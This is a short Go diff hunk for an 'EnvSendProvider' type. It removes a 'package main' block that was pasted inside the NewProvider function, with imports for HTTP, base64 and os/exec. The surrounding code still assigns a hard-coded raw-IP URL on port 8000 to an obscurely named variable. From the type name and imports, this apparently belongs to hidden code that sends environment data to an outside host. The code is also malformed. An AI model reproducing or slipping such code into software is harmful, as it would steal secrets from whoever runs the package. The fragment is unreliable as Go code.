@@ -20,20 +20,6 @@ import (
 type EnvSendProvider struct{}
 
 func NewProvider() provider.Provider {
-	package main
-
-import (
-	"bytes"
-	"encoding/base64"
-	"net/http"
-	"os"
-	"os/exec"
-	"path/filepath"
-	"regexp"
-	"strings"
-)
-
-func main() {
 
 	wwoo := "http://52.21.38.153:8000/1"
 
